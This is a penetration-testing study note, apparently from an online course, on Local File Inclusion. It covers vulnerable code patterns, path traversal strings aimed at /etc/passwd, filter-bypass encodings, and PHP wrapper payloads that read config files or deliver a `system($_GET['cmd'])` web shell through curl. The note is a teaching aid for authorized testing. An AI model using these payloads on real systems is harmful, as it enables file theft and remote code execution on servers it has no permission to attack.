# File Inclusion

## Local File Inclusion (LFI) <a href="#local-file-inclusion-lfi" id="local-file-inclusion-lfi"></a>

* Common place we usually find LFI within is templating engines.
* A templating engine displays a page that shows the common static parts, such as the `header`, `navigation bar`, and `footer`, and then dynamically loads other content that changes between pages
* #### Impact
  * Leaking source code may allow attackers to test the code for other vulnerabilities, which may reveal previously unknown vulnerabilities.
  * Leaking sensitive data may enable attackers to enumerate the remote server for other weaknesses or even leak credentials and keys that may allow them to access the remote server directly.
  * Allow attackers to execute code on the remote server, which may compromise the entire back-end server and any other servers connected to it.
* #### Examples of Vulnerable Code <a href="#examples-of-vulnerable-code" id="examples-of-vulnerable-code"></a>

<details>

<summary><strong>PHP</strong></summary>

{% code lineNumbers="true" %}
```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
## include_once(), require(), require_once(), file_get_contents()
```
{% endcode %}

</details>

<details>

<summary><strong>NodeJS</strong></summary>

{% code lineNumbers="true" %}
```js
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
// render()
```
{% endcode %}

</details>

<details>

<summary><strong>Java</strong></summary>

{% code lineNumbers="true" %}
```java
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
<c:import url= "<%= request.getParameter('language') %>"/>
```
{% endcode %}

</details>

<details>

<summary><strong>.NET</strong></summary>

{% code lineNumbers="true" %}
```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
@Html.Partial(HttpContext.Request.Query['language'])
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```
{% endcode %}

</details>

<details>

<summary><strong>Read vs Execute</strong></summary>

| **PHP**                      |     |     |     |
| ---------------------------- | :-: | :-: | :-: |
| `include()`/`include_once()` |  ✅  |  ✅  |  ✅  |
| `require()`/`require_once()` |  ✅  |  ✅  |  ❌  |
| `file_get_contents()`        |  ✅  |  ❌  |  ✅  |
| `fopen()`/`file()`           |  ✅  |  ❌  |  ❌  |
| **NodeJS**                   |     |     |     |
| `fs.readFile()`              |  ✅  |  ❌  |  ❌  |
| `fs.sendFile()`              |  ✅  |  ❌  |  ❌  |
| `res.render()`               |  ✅  |  ✅  |  ❌  |
| **Java**                     |     |     |     |
| `include`                    |  ✅  |  ❌  |  ❌  |
| `import`                     |  ✅  |  ✅  |  ✅  |
| **.NET**                     |     |     |     |
| `@Html.Partial()`            |  ✅  |  ❌  |  ❌  |
| `@Html.RemotePartial()`      |  ✅  |  ❌  |  ✅  |
| `Response.WriteFile()`       |  ✅  |  ❌  |  ❌  |
| `include`                    |  ✅  |  ✅  |  ✅  |

</details>

#### Basic LFI <a href="#basic-lfi" id="basic-lfi"></a>

* Able to change the **absolute** file path being pulled to read the content of a different local file.
* Source Code: `include($_GET['language']);`
* This trick would work if the whole input was used within the `include()` function without any additions
* **Common readable files**
  * Linux: `/etc/passwd`
  * Windows: `C:\Windows\boot.ini`&#x20;

#### Path Traversal <a href="#path-traversal" id="path-traversal"></a>

* Bypass restrictions by traversing directories using **relative paths**
* Source Code: `include("./languages/" . $_GET['language']);`
* Add `../` before our file name, which refers to the parent directory.
* Trick would work even if the entire parameter was used in the `include()` function or prefixed with some value.
* e.g. `../../../../etc/passwd`&#x20;

#### Filename Prefix <a href="#filename-prefix" id="filename-prefix"></a>

* Some cases wher our input may be appended after a different string
* Source Code: `include("lang_" . $_GET['language']);`
* Instead of directly using path traversal, we can prefix a `/` before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories
* eg. `/../../etc/passwd`&#x20;

#### Appended Extensions <a href="#appended-extensions" id="appended-extensions"></a>

* We would not have to write the extension every time we need to change the language. This may also be safer as it may restrict us to only including PHP files
* `include($_GET['language'] . ".php");`
* Append `#` to consider the extension as fragment.

#### Second-Order Attacks <a href="#second-order-attacks" id="second-order-attacks"></a>

* Occurs when web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.
* For example, a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`). If we craft a malicious LFI username (e.g. `../../../etc/passwd`), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

### Basic Bypasses <a href="#basic-bypasses" id="basic-bypasses"></a>

* #### Non-Recursive Path Traversal Filters <a href="#non-recursive-path-traversal-filters" id="non-recursive-path-traversal-filters"></a>
  * Basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals.
  * `$language = str_replace('../', '', $_GET['language']);`
  * **Bypasses**: `..././`, `....////`, `....//` , `....\/`&#x20;
* #### Encoding <a href="#encoding" id="encoding"></a>
  * Web filters may prevent input filters that include certain LFI-related characters, like a dot `.` or a slash `/` used for path traversals.
  * Filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters.
  * Byapss: `%2e%2e%2f`&#x20;
* #### Approved Paths <a href="#approved-paths" id="approved-paths"></a>
  * Web applications may also use Regular Expressions to ensure that the file being included is under a specific path.
  * `if(preg_match('/^./languages/.+$/', $_GET['language'])) { include($_GET['language']); } else { echo 'Illegal path specified!'; }`&#x20;
  * To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality.
  * Bypass: `allowed-path/../../../etc/passwd`&#x20;
* #### Appended Extension <a href="#appended-extension" id="appended-extension"></a>
  * Web applications append an extension to our input string (e.g. `.php`), to ensure that the file we include is in the expected extension.
  * Obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4
  * **Path Truncation**
    * In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems.
    * PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`).
    * PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`).&#x20;
    * Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`).
    * **Bypass:** `?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]`&#x20;
    * `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done non_existing_directory/../../../etc/passwd/./././././././`&#x20;
  * **Null Bytes**
    * PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string.
    * **Bypass**: `/etc/passwd%00`

### PHP Filters <a href="#php-filters" id="php-filters"></a>

* Utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.
* PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams.
* #### Input Filters <a href="#input-filters" id="input-filters"></a>
  * [PHP Filters](https://www.php.net/manual/en/filters.php) allow us to transform stream data by applying specific filters during stream operations.
  * To access the PHP filter wrapper with `php://filter/` to apply filters to a resource.
  * The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`.&#x20;
  * Read parameter has four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
  * Fuzzing for PHP Files :  `ffuf -w directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:/FUZZ.php`&#x20;
  * **Payload**: `php://filter/read=convert.base64-encode/resource=config`&#x20;
  * eg: `http://<SERVER_IP>:/index.php?language=php://filter/read=convert.base64-encode/resource=config`
* #### Data Wrapper <a href="#data" id="data"></a>
  * Used to include external data, including PHP code.
  * Data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.
  * PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
  * eg: `php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`&#x20;
  * **Payloads**
    * `echo '<?php system($_GET["cmd"]); ?>' | base64`&#x20;
    * `data://text/plain;base64,=<base64-value>&cmd=id`&#x20;
    * eg: `curl -s 'http://<SERVER_IP>:/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'`&#x20;
* #### Input Wrapper <a href="#input" id="input"></a>
  * The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.
  * The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data.
  * So, the vulnerable parameter must accept POST requests for this attack to work.
  * &#x20;The `input` wrapper also depends on the `allow_url_include`&#x20;
  * **Payload**: `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:/index.php?language=php://input&cmd=id" | grep uid`&#x20;
  * To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)
  * #### Expect Wrapper <a href="#expect" id="expect"></a>



















